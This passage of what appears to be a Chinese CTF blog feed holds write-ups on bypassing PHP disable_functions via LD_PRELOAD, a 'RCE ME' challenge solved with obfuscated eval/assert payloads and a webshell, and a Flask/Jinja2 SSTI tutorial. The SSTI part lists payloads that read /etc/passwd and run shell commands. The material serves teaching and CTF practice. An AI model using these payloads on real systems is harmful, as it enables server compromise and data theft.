`/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3Stack trace:#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)#1 &#123;main&#125;  thrown in /root/sky.php on line 3</code></pre><p>我们成功的进行了列目录</p><p>这里串一下思路：</p><p>首先执行sky.php ,设置了恶意环境变量。下一步我们需要调用子进程来加载环境变量，所以这里就会使用new imagick(‘sky.wmv’),调用了ffmpeg这个子进程，这个进程在加载之前就调用了环境变量，加载了共享对象sky.so.加载完后它会自动执行__attribute__ ((<strong>constructor</strong>)),就会调用system命令。</p><h2 id="getflag流程"><a href="#getflag流程" class="headerlink" title="getflag流程:"></a>getflag流程:</h2><p>那么现在思路很清晰：</p><p>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中</p><p>2.利用backdoor运行sky.php</p><p>3.在tmp目录读取重定向的结果</p><p>参考：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> （膜拜大佬，基本都是搬过来的，自己的代码功底太弱，大佬讲的又非常好就搬运了一下）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 RCE ME __0X01-0X0F</title>
      <link href="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/"/>
      <url>/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/</url>
      
        <content type="html"><![CDATA[<h1 id="打开题目，源码如图，看起来很简单："><a href="#打开题目，源码如图，看起来很简单：" class="headerlink" title="打开题目，源码如图，看起来很简单："></a>打开题目，源码如图，看起来很简单：</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><p>重点关注 preg_match() 函数，它将所有的字母和数字都进行了过滤，所以我们无法通过$code直接传入命令，因此需要绕过。</p><p>最常用的就是取反绕过。</p><p>先取phpinfo来测试一下</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143439534.png" alt="image-20211018143439534"></p><p>为什么要加urlencode()？这里是因为字符串取反后会变成无法识别的字符，而这也是能绕过preg_match()函数的原因。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143653122.png" alt="image-20211018143653122"></p><p>成功得到信息。</p><p>下一步考虑通过取反来构建webshell。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143038799.png" alt="image-20211018143038799"></p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143850709.png" alt="image-20211018143850709"></p><p>测试一下webshell是否有效：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144115367.png" alt="image-20211018144115367"></p><p>成功，使用蚁剑来连接一下。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144244347.png" alt="image-20211018144244347"></p><p>连接成功。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144318564.png" alt="image-20211018144318564"></p><p>在根目录发现了readflag和flag，根据经验是要我们执行readflag来获取到flag。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144428698.png" alt="image-20211018144428698"></p><p>这时候就懵逼了，命令无法执行是一个废shell。</p><p>让我们再会到phpinfo()仔细观察，发现如下：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143523288.png" alt="image-20211018143523288"></p><p>敏感函数基本全被禁用了。</p><p>那我们就要绕过disable_functions来执行readflag文件了。</p><h2 id="蚁剑中有一个插件可以绕过disable-functions-非预期解法"><a href="#蚁剑中有一个插件可以绕过disable-functions-非预期解法" class="headerlink" title="蚁剑中有一个插件可以绕过disable_functions(非预期解法)"></a>蚁剑中有一个插件可以绕过disable_functions(非预期解法)</h2><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144830831.png" alt="image-20211018144830831"></p><p>启用插件，选择</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145031532.png" alt="image-20211018145031532"></p><p>发现成功绕过，并执行readflag文件获取到了flag</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145133785.png" alt="image-20211018145133785"></p><h2 id="通过LD-PRELOAD与putenv来执行命令"><a href="#通过LD-PRELOAD与putenv来执行命令" class="headerlink" title="通过LD_PRELOAD与putenv来执行命令"></a>通过LD_PRELOAD与putenv来执行命令</h2><p>基本思路：</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。在另一篇博客中我会详细的介绍下这个，这里不做深入讨论。</p><p>发现/var/tmp目录下有上传权限，上传exp，<img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019221359870.png" alt="image-20211019221359870"></p><p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p><pre><code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></pre><p>由于在本题中对code有字符数量的限制，所以需要修改我们的payload为异或：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019230656350.png" alt="image-20211019230656350"></p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])</code></pre><pre><code>http://543c3847-4a06-4587-b8a5-7be27d7b7d7d.node4.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019225739892.png" alt="image-20211019225739892"></p><p>看网上的大多数是第一种解法，感觉大家都太浮躁，我也不例外。不能为了刷题而刷题。掌握知识点和方法，才能在遇到相似题目时能够及时写出来。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti-flak框架</title>
      <link href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/"/>
      <url>/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="初始ssti漏洞"><a href="#初始ssti漏洞" class="headerlink" title="初始ssti漏洞"></a>初始ssti漏洞</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p></blockquote><p><strong>SSTI</strong>，<strong>服务器端模板注入</strong>(Server-Side Template Injection)</p><ul><li>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分</li><li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容</li><li>从而导致信息泄露、代码执行、GetShell等问题</li><li>其影响范围主要取决于模版引擎的复杂性</li><li><strong>注意</strong>：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</li></ul><p>ssti漏洞其实有很多种，因为不同的框架语法不同，所以呢，我们注入的时候还要判断是什么框架</p><p>主要的模板语言（我们经常使用的是flask）</p><ul><li>Python：flask、 mako、 tornado、 django</li><li>php：smarty、 twig</li><li>java：jade、 velocity</li></ul><p>这次我们介绍的常用的flask框架，常用的语言为jinjia2。</p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>先看一段代码</p><pre><code>from flask import flask @app.route(&#39;/index/&#39;)def hello_word():    return &#39;hello word&#39;</code></pre><p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word。</p><h3 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h3><p>flask的渲染方法有render_template和render_template_string两种。</p><p>render_template()是用来渲染一个指定的文件的。使用如下</p><pre><code>return render_template(&#39;index.html&#39;)</code></pre><p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p><p>使用方法如下</p><pre><code>html = &#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;return render_template_string(html)</code></pre><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>flask是使用Jinja2来作为渲染引擎的。看例子</p><p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;</code></pre><p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p><p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p><p>例子</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;,content=&#39;This is index page.&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;&#123;&#123;content&#125;&#125;&lt;/h1&gt;</code></pre><p>这个时候页面仍然输出<code>This is index page</code>。</p><pre><code>&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符。```不正确的使用flask中的`render_template_string`方法会引发SSTI。那么是什么不正确的代码呢？### xss利用存在漏洞的代码```@app.route('/test/')def test():    code = request.args.get('id')    html = '''        <h3>%s</h3>    '''%(code)    return render_template_string(html)```这段代码存在漏洞的原因是数据和代码的混淆。代码中的`code`是用户可控的，会和html拼接后直接带入渲染。尝试构造code为一串js代码。![1.png](ssti-flak框架/1540787703_5bd68df77bdf5.png!small)将代码改为如下```@app.route('/test/')def test():    code = request.args.get('id')    return render_template_string('<h1>&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#39;,code=code)</h1></code></pre><p>继续尝试</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787852_5bd68e8c570a5.png!small" alt="2.png"></p><p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p><p>模板注入并不局限于xss，它还可以进行其他攻击。</p><h3 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;`是变量包裹标识符。`&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p>这里还是用上文中存在漏洞的代码</p><pre><code>@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>构造参数<code>&#123;&#123;2*4&#125;&#125;</code>，结果如下</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787878_5bd68ea683cce.png!small" alt="3.png">可以看到表达式被执行了。</p><p>在flask中也有一些全局变量。<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787904_5bd68ec05001a.png!small" alt="4.png"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。</p><p>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><p>几个魔术方法</p><pre><code>__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用</code></pre><p>1 、获取字符串的类对象</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;</code></pre><p>2 、寻找基类</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p>3 、寻找可用引用</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]可以看到有一个`&lt;type &#39;file&#39;&gt;`</code></pre><p>4 、利用之</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>放到模板里<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787928_5bd68ed820299.png!small" alt="5.png"></p><p>可以看到读取到了文件。</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>继续看命令执行payload的构造，思路和构造文件读取的一样。</p><p>寻找包含os模块的脚本</p><pre><code>#!/usr/bin/env python# encoding: utf-8for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():    try:         if &#39;os&#39; in item.__init__.__globals__:             print num,item         num+=1    except:        print &#39;-&#39;        num+=1</code></pre><p>输出</p><pre><code>-71 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt;</code></pre><p>payload</p><pre><code class="python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></pre><p>一般利用点还有 warnings.catch_warnings（一般在59）这个子类，虽然它没有os模块，但warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><ul><li>subprocess.Popen进行RCE</li></ul><p>我们可以用find2.py寻找subprocess.Popen这个类，可以直接RCE，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><ul><li>直接利用os</li></ul><p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p><p>我们把上面的find.py脚本中的search变量赋值为os，去寻找含有os的类</p><pre><code>λ python find.py(&lt;class &#39;site._Printer&#39;&gt;, 69)(&lt;class &#39;site.Quitter&#39;&gt;, 74)</code></pre><p>后面如法炮制，payload如下</p><pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code></pre><p>构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye</p><p>一些利用脚本：</p><p>find.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/f5452aaf65534a159b2328f9b8152b07.jpeg" alt="img"></p><p>我们运行这个脚本</p><pre><code>λ python3 find.py&lt;class &#39;os._wrap_close&#39;&gt; 128</code></pre><p>可以发现object基类的第128个子类名为os._wrap_close的这个类有popen方法</p><p>先调用它的__init__方法进行初始化类</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__&lt;function _wrap_close.__init__ at 0x000001FCD0B21E58&gt;</code></pre><p>再调用__globals__可以获取到方法内以字典的形式返回的方法、属性等值</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__&#123;&#39;__name__&#39;: &#39;os&#39;...中间省略...&lt;class &#39;os.PathLike&#39;&gt;&#125;</code></pre><p>然后就可以调用其中的popen来执行命令</p><pre><code>Python 3.7.8&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#39;desktop-t6u2ptl\\think\n&#39;</code></pre><p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个find.py，这里用hhhm师傅的一个脚本直接去寻找子类</p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode.gif" alt="复制代码"></a></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/552cd597f7d84fcc9d284fdfe0fba5d4.jpeg" alt="img"></p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><p><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/552cd597f7d84fcc9d284fdfe0fba5d4" alt="img"></p><p>又或者用如下的requests脚本去跑</p><p>find3.py</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/4512851a74e64923982ffcf8b91e38b9.jpeg" alt="img"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/9c63cdfd510c443a8294cfb5091773d6.jpeg" alt="img"></p><h2 id="大概过程（读取config）"><a href="#大概过程（读取config）" class="headerlink" title="大概过程（读取config）"></a>大概过程（读取config）</h2><p>一般来说，读取config我们直接就，就能读取config配置文件，但是为了增加难度，肯定会过滤掉config，让我们读取config配置文件</p><p>这时就需要通过python自带函数调用____globals____变量集合,然后调用其中的current_app全局变量的config</p><h3 id="flask有4个全局变量"><a href="#flask有4个全局变量" class="headerlink" title="flask有4个全局变量"></a>flask有4个全局变量</h3><pre><code>current_app代表当前flask程序实例g作为flask程序全局的临时变量requests客户端发送的HTTP请求内容session用户会话</code></pre><h3 id="python自带函数"><a href="#python自带函数" class="headerlink" title="python自带函数"></a>python自带函数</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p>你可以从模板中直接访问Flask当前的config对象:</p><pre><code>&#123;&#123;config.SQLALCHEMY_DATABASE_URI&#125;&#125;sqlite:///database.db</code></pre><h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><p>就是flask中代表当前请求的request对象：</p><pre><code>&#123;&#123;request.url&#125;&#125;http://127.0.0.1</code></pre><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>为Flask的session对象</p><pre><code>&#123;&#123;session.new&#125;&#125;True</code></pre><h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for()"></a>url_for()</h4><p>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接:</p><pre><code>&#123;&#123;url_for('home')&#125;&#125;/</code></pre><p>如果我们定义的路由URL是带有参数的,则可以把它们作为关键字参数传入url_for(),Flask会把他们填充进最终生成的URL中:</p><pre><code>&#123;&#123; url_for('post', post_id=1)&#125;&#125;/post/1</code></pre><h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h4><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p><pre><code>&#123;%for message in get_flashed_messages()%&#125;    &#123;&#123;message&#125;&#125;&#123;%endfor%&#125;</code></pre><p>大致playload</p><pre><code>&#123;&#123;url_for('__globals__')['current_app']['config']&#125;&#125;</code></pre><p>下面我列一些pos</p><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><pre><code class="python">读目录、文件&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').listdir('/')")&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].__dict__['system']('ls')&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.open('xxx','r').read()&#125;&#125;页面没有回显时#命令执行： &#123;% for c in [].__class__.__base__.__subclasses__() %&#125; #先通过for循环根据模块名寻找符合要求的模块&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;#如果找到该模块就进行后续的函数操作&#123;% endif %&#125;&#123;% endfor %&#125;   # 结束判断结束循环#文件操作    &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><p>对一些过滤的绕过方法</p><h3 id="过滤了小括号"><a href="#过滤了小括号" 